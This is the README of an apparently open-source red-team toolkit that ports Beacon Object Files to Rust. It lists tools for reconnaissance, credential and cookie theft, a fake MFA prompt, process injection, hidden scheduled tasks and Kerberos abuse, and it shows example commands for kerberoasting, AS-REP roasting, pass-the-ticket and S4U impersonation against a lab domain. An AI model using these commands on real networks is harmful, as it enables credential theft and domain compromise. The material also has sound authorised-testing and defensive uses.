## Armory

Rust Beacon Object Files (BOFs). 115 TrustedSec BOFs and 16 Kerbeus BOFs ported from C to Rust using the [rustbof](https://github.com/joaoviictorti/rustbof) framework.

## Credits

- [MITRE ATT&CK](https://attack.mitre.org/) - Adversarial tactics, techniques, and common knowledge framework
- [rustbof](https://github.com/joaoviictorti/rustbof) by [Joao Victor](https://github.com/joaoviictorti) - Rust BOF framework
- [CS-Situational-Awareness-BOF](https://github.com/trustedsec/CS-Situational-Awareness-BOF) by [TrustedSec](https://github.com/trustedsec) - Original C BOFs (Situational Awareness)
- [CS-Remote-OPs-BOF](https://github.com/trustedsec/CS-Remote-OPs-BOF) by [TrustedSec](https://github.com/trustedsec) - Original C BOFs (Remote Operations and Injection)
- [Kerbeus-BOF](https://github.com/RalfHacker/Kerbeus-BOF) by [RalfHacker](https://github.com/RalfHacker) - Original C BOFs (Kerberos abuse, Rubeus implementation)
- [Rubeus](https://github.com/GhostPack/Rubeus) by [GhostPack](https://github.com/GhostPack) - Original .NET Kerberos toolset
- [nanorobeus](https://github.com/wavvs/nanorobeus) by [wavvs](https://github.com/wavvs) - Kerberos BOF reference

## Situational Awareness

| BOF | Description | MITRE ATT&CK |
|-----|-------------|---------------|
| `env` | List environment variables | T1082 |
| `uptime` | System uptime, local time, boot time | T1082 |
| `whoami` | Current user, groups, privileges | T1033, T1069 |
| `ipconfig` | Network adapter configuration | T1016 |
| `locale` | System locale, language, country | T1082 |
| `resources` | Memory and disk usage | T1082 |
| `arp` | ARP cache table | T1016 |
| `routeprint` | IPv4 routing table | T1016 |
| `netstat` | TCP/UDP connections with PIDs | T1049 |
| `windowlist` | Desktop window titles | T1010 |
| `dir` | Directory listing | T1083 |
| `listdns` | DNS resolver cache | T1018 |
| `useridletime` | User idle time | T1082 |
| `md5` | MD5 hash of a file | T1083 |
| `sha1` | SHA1 hash of a file | T1083 |
| `sha256` | SHA-256 hash of a file | T1083 |
| `enumlocalsessions` | User sessions | T1033 |
| `nettime` | Remote computer time | T1124 |
| `netuptime` | Remote boot time | T1082 |
| `nslookup` | DNS query | T1018 |
| `probe` | TCP port scanner | T1046 |
| `get_session_info` | Logon session data | T1033 |
| `findLoadedModule` | Find processes with a DLL | T1057 |
| `listmods` | List process modules | T1057 |
| `netloggedon` | Logged-on users | T1033 |
| `netshares` | Network shares | T1135 |
| `netlocalgroup` | Local groups and members | T1069.001 |
| `sc_query` | Service status/enumeration | T1007 |
| `sc_qc` | Service configuration | T1007 |
| `sc_qdescription` | Service description | T1007 |
| `sc_qfailure` | Service failure actions | T1007 |
| `sc_qtriggerinfo` | Service triggers | T1007 |
| `cacls` | File/directory ACL permissions | T1222 |
| `driversigs` | EDR/AV driver signatures | T1518.001 |
| `reg_query` | Registry keys and values | T1012 |
| `enum_filter_driver` | Minifilter drivers | T1518.001 |
| `netuserenum` | Domain/local user accounts | T1087 |
| `netgroup` | Domain groups and members | T1069.002 |
| `get_password_policy` | Password and lockout policies | T1201 |
| `netview` | Network computers | T1018 |
| `get_netsession` | Network sessions | T1049 |
| `netuser` | Detailed user info | T1087.002 |
| `netuse` | Map/disconnect network drives | T1021.002 |
| `regsession` | Logged-on user SIDs from HKU | T1033 |
| `notepad` | Read Notepad window text | T1010 |
| `get_dpapi_system` | DPAPI system keys | T1003.004 |
| `ldapsearch` | LDAP search | T1087.002 |
| `ldapsecuritycheck` | LDAP signing check | T1557.001 |
| `nonpagedldapsearch` | Non-paged LDAP search | T1087.002 |
| `adcs_enum` | ADCS CA enumeration | T1649 |
| `adcs_enum_com` | ADCS enumeration via COM | T1649 |
| `adcs_enum_com2` | ADCS template enumeration | T1649 |
| `adv_audit_policies` | Audit policy settings | T1562.002 |
| `aadjoininfo` | Azure AD join info | T1087.004 |
| `list_firewall_rules` | Firewall rules | T1518 |
| `vssenum` | Volume shadow copies | T1003.003 |
| `wmi_query` | WMI query | T1047 |
| `tasklist` | Process list | T1057 |
| `schtasksenum` | Scheduled tasks | T1053.005 |
| `schtasksquery` | Scheduled task details | T1053.005 |
| `netloggedon2` | Logged-on users (JSON) | T1033 |
| `netlocalgroup2` | Local groups (JSON) | T1069.001 |
| `get_netsession2` | Network sessions (JSON) | T1049 |

## Remote Operations

| BOF | Description | MITRE ATT&CK |
|-----|-------------|---------------|
| `get_priv` | Enable token privilege | T1134.002 |
| `sc_start` | Start a service | T1569.002 |
| `sc_stop` | Stop a service | T1489 |
| `sc_create` | Create a service | T1543.003 |
| `sc_delete` | Delete a service | T1489 |
| `sc_config` | Modify service config | T1543.003 |
| `sc_description` | Set service description | T1543.003 |
| `sc_failure` | Set service failure actions | T1543.003 |
| `suspendresume` | Suspend/resume a process | T1106 |
| `adduser` | Create local user | T1136.001 |
| `addusertogroup` | Add user to group | T1098 |
| `setuserpass` | Change user password | T1098 |
| `disableuser` | Disable user account | T1531 |
| `enableuser` | Enable user account | T1098 |
| `unexpireuser` | Set password no-expire | T1098 |
| `reg_set` | Set registry value | T1112 |
| `reg_delete` | Delete registry key/value | T1112 |
| `reg_save` | Save registry hive | T1003.002 |
| `shutdown` | Shutdown/reboot computer | T1529 |
| `procdump` | Dump process memory | T1003.001 |
| `ProcessListHandles` | List process handles | T1057 |
| `ProcessDestroy` | Close remote handles | T1489 |
| `chromeKey` | Decrypt Chrome key (DPAPI) | T1555.003 |
| `shspawnas` | Spawn as another user | T1134.002 |
| `ask_mfa` | Fake MFA prompt | T1056.002 |
| `office_tokens` | Scan for JWT tokens | T1528 |
| `slack_cookie` | Extract Slack cookie | T1539 |
| `lastpass` | Scan for LastPass data | T1555.005 |
| `slackKey` | Extract Slack API tokens | T1528 |
| `global_unprotect` | Decrypt GlobalProtect config | T1555 |
| `get_azure_token` | Azure OAuth token cache | T1528 |
| `make_token_cert` | Import PFX certificate | T1649 |
| `adcs_request` | ADCS certificate request | T1649 |
| `adcs_request_on_behalf` | ADCS enrollment agent | T1649 |
| `schtaskscreate` | Create scheduled task | T1053.005 |
| `schtasksdelete` | Delete scheduled task | T1053.005 |
| `schtasksrun` | Run scheduled task | T1053.005 |
| `schtasksstop` | Stop scheduled task | T1053.005 |
| `ghost_task` | Hidden scheduled task | T1053.005 |
| `netuse` | Map network drives | T1021.002 |

## Injection

| BOF | Description | MITRE ATT&CK |
|-----|-------------|---------------|
| `createremotethread` | CreateRemoteThread | T1055.001 |
| `ntcreatethread` | NtCreateThreadEx | T1055 |
| `ntqueueapcthread` | APC queue injection | T1055.004 |
| `setthreadcontext` | Thread context hijacking | T1055.003 |
| `clipboard` | Clipboard injection | T1055 |
| `svcctrl` | Service control injection | T1055 |
| `tooltip` | Tooltip injection | T1055 |
| `uxsubclassinfo` | UxSubclassInfo injection | T1055 |
| `conhost` | Console host injection | T1055 |
| `dde` | DDE injection | T1055 |
| `kernelcallbacktable` | KernelCallbackTable hijack | T1055.012 |

## Kerberos

| BOF | Description | MITRE ATT&CK |
|-----|-------------|---------------|
| `hash` | RC4/AES128/AES256 hash from password | T1558 |
| `describe` | Parse and display .kirbi ticket | T1558 |
| `klist` | List cached Kerberos tickets | T1558.003 |
| `triage` | Compact Kerberos ticket table | T1558.003 |
| `purge` | Purge cached Kerberos tickets | T1558.003 |
| `ptt` | Pass-the-ticket (.kirbi import) | T1550.003 |
| `dump` | Export cached tickets as base64 | T1558.003 |
| `asktgt` | Request TGT via AS-REQ | T1558.003 |
| `asktgs` | Request service ticket via TGS-REQ | T1558.003 |
| `renew` | Renew TGT | T1558.003 |
| `tgtdeleg` | Extract TGT via GSS-API delegation | T1558.003 |
| `kerberoasting` | SPN ticket request for offline cracking | T1558.003 |
| `asreproasting` | AS-REP roast (no preauth users) | T1558.004 |
| `s4u` | S4U2Self/S4U2Proxy delegation abuse | T1550.003 |
| `cross_s4u` | Cross-realm S4U delegation | T1550.003 |
| `changepw` | Kerberos password change | T1098 |

### hash

```
> hash /password:horse /user:khal.drogo /domain:essos.local

[*] Action: Calculate Password Hash(es)

[*] Input Password           : horse
[*] Input Username           : khal.drogo
[*] Input Domain             : essos.local
[*]     rc4_hmac             : 739120ebc4dd940310bc4bb5c9d37021
[*]     aes128_cts_hmac_sha1 : 7d76da251df8d5cec9bf3732e1f6c1ac
[*]     aes256_cts_hmac_sha1 : 2ef916a78335b11da896216ad6a4f3b1fd6276938d14070444900a75e5bf7eb4
```

### asktgt

```
> asktgt /user:khal.drogo /password:horse /domain:essos.local /dc:DC_IP

[*] Action: Ask TGT

[*] Building AS-REQ (w/ preauth) for: 'essos.local\khal.drogo'
[+] TGT request successful!
[*] base64(ticket.kirbi):

doIFCDCCBQSgAwIBBaEDAgEWooIEFjCCBBJhggQOMIIECqADAgEFoQ0bC0VTU09TLkxPQ0FM...
```

### describe

```
> describe /ticket:doIFCDCCBQSgAwIBBaEDAgEW...

[*] Action: Describe ticket

  ServiceName              :  krbtgt/ESSOS.LOCAL
  ServiceRealm             :  ESSOS.LOCAL
  UserName                 :  khal.drogo
  UserRealm                :  ESSOS.LOCAL
  StartTime (UTC)          :  04/04/2026 03:05:44
  EndTime (UTC)            :  04/04/2026 13:05:44
  RenewTill (UTC)          :  05/04/2026 03:05:44
  Flags                    :
  KeyType                  :  rc4_hmac
```

### asktgs

```
> asktgs /ticket:<TGT> /service:MSSQLSvc/braavos.essos.local /dc:DC_IP

[*] Action: Ask TGS

[*] Requesting service ticket for: MSSQLSvc/braavos.essos.local
[*] Using TGT for: khal.drogo@ESSOS.LOCAL
[+] TGS request successful!
[*] base64(ticket.kirbi):

doIFJDCCBSCgAwIBBaEDAgEWooIEKDCCBCRhggQgYYIEHDCCBBigAwIBBaENGwtFU1NPUy5MT0NBTA...
```

### asreproasting

```
> asreproasting /user:missandei /domain:essos.local /dc:DC_IP

[*] Action: AS-REP Roasting

[*] Building AS-REQ (w/o preauth) for: 'essos.local\missandei'
[+] AS-REP hash:

$krb5asrep$23$missandei@ESSOS.LOCAL:a2892d7bffefac532fd67083a2452dc0$288acd1a3fc5...
```

### kerberoasting

```
> kerberoasting /spn:MSSQLSvc/braavos.essos.local /nopreauth:khal.drogo /domain:essos.local /dc:DC_IP

[*] Action: Kerberoasting

[*] Target SPN: MSSQLSvc/braavos.essos.local
[*] Using khal.drogo without pre-auth to request service tickets
[+] Hash:

$krb5tgs$23$*MSSQLSvc/braavos.essos.local$ESSOS.LOCAL$MSSQLSvc/braavos.essos.local*$...
```

### klist

```
> klist

Action: List Kerberos Tickets (Current User)

UserName                : user
Domain                  : YOURPC
LogonId                 : 0:0x3e7
Session                 : 1
UserSID                 : S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX-XXXX
Authentication package  : NTLM
LogonServer             : YOURPC
UserPrincipalName       :

[*] Cached tickets: (0)
```

### triage

```
> triage

Action: List Kerberos Tickets (All Users)

--------------------------------------------------------------------------------------------------------------------------
| LUID          | Client                                   | Service                                  |            End Time |
--------------------------------------------------------------------------------------------------------------------------
| 0:0x3e7       | khal.drogo @ ESSOS.LOCAL                 | krbtgt/ESSOS.LOCAL                       | 04/04/2026 13:05:44 |
| 0:0x3e7       | khal.drogo @ ESSOS.LOCAL                 | MSSQLSvc/braavos.essos.local             | 04/04/2026 13:05:44 |
--------------------------------------------------------------------------------------------------------------------------
```

### purge

```
> purge

[*] Action: Purge Tickets

[+] Successfully purged tickets.
```

### ptt

```
> ptt /ticket:<BASE64>

[*] Action: Import Ticket

[+] Ticket successfully imported.
```

### dump

```
> dump

Action: Dump Kerberos Tickets (Current User)

UserName                : user
Domain                  : YOURPC
LogonId                 : 0:0x3e7
UserSID                 : S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX-XXXX

[*] Cached tickets: (0)
```

### renew

```
> renew /ticket:<TGT> /dc:DC_IP

[*] Action: Renew TGT

[*] Renewing TGT for: khal.drogo@ESSOS.LOCAL
[+] TGT renewal successful!
[*] base64(ticket.kirbi):

doIFCDCCBQSgAwIBBaEDAgEW...
```

### s4u

```
> s4u /ticket:<TGT> /service:cifs/target.essos.local /impersonateuser:administrator /dc:DC_IP

[*] Action: S4U

[*] Impersonating: administrator
[*] Target service: cifs/target.essos.local
[*] Using TGT for: khal.drogo@ESSOS.LOCAL
[+] S4U request successful!
[*] base64(ticket.kirbi):

doIFJDCCBSCgAwIBBaEDAgEW...
```

### cross_s4u

```
> cross_s4u /ticket:<TGT> /service:cifs/target.essos.local /targetdomain:north.sevenkingdoms.local /impersonateuser:administrator

[*] Action: Cross-domain S4U

[*] Service: cifs/target.essos.local
[*] Target domain: north.sevenkingdoms.local
[*] Impersonate: administrator
```

### changepw

```
> changepw /ticket:<TGT> /new:NewP@ssw0rd! /dc:DC_IP

[*] Action: Change Password

[*] Using TGT for: khal.drogo@ESSOS.LOCAL
[*] New password length: 12 chars
[+] Got kadmin/changepw service ticket
```

### tgtdeleg

```
> tgtdeleg

[*] Action: TGT Delegation Trick

[*] Target SPN: cifs/kingslanding.sevenkingdoms.local
[*] Got SSPI output token: 1847 bytes
[*] Found AP-REQ: 1280 bytes
```

## Building

Requires Rust nightly, [boflink](https://github.com/MEhrn00/boflink), [cargo-make](https://github.com/sagiegurari/cargo-make), and MinGW-w64.

```bash
cd bofs/sa/whoami
cargo make
# Output: out/whoami.x64.o
```

Use [COFFLoader](https://github.com/trustedsec/COFFLoader) or any compatible loader to test.

## License

MIT. See [LICENSE](./LICENSE)

The author assumes no responsibility for misuse, damages, or legal consequences arising from the use of this software. Users are solely responsible for ensuring compliance with all applicable laws, regulations, and organizational policies. By using this software, you agree that you have proper authorization for any systems you interact with.

## Author

[memN0ps](https://github.com/memN0ps)
